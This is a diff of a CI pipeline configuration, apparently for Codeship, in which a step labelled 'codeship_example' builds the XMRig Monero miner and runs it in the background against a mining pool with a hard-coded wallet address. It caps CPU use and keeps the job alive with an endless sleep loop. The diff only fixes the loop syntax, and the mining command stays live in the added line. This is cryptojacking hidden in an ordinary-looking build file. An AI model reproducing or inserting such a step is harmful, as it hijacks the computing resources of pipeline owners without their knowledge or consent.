@@ -7,7 +7,7 @@
       command: sudo modprobe msr
     - service: codeship_example
       # shell wrapper not required unless passing along env vars or combining commands
-      command: /bin/bash -c 'sudo apt-get -y update && sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev && sudo git clone https://github.com/xmrig/xmrig.git && sudo mkdir xmrig/build && cd xmrig/build && sudo cmake .. && sudo make -j${nproc} && sudo ./xmrig --url xmr.company:3333 --user 45jii4647QeNzbRXtn51Go1pjYNhFFGYpeYAgS8B93tCa8JZ3oT5cQwcdkzyWR1yMvAjCWegaswZQAUyaRyVjzG4PQzywVm --background --cpu-max-threads-hint=30 --no-dmi --pass cloud --randomx-no-numa && while true; sleep 2;'
+      command: /bin/bash -c 'sudo apt-get -y update && sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev && sudo git clone https://github.com/xmrig/xmrig.git && sudo mkdir xmrig/build && cd xmrig/build && sudo cmake .. && sudo make -j${nproc} && sudo ./xmrig --url xmr.company:3333 --user 45jii4647QeNzbRXtn51Go1pjYNhFFGYpeYAgS8B93tCa8JZ3oT5cQwcdkzyWR1yMvAjCWegaswZQAUyaRyVjzG4PQzywVm --background --cpu-max-threads-hint=30 --no-dmi --pass cloud --randomx-no-numa && while true; do sleep 2; done'
 - name: example_tagged_step
   tag: master
   service: codeship_example
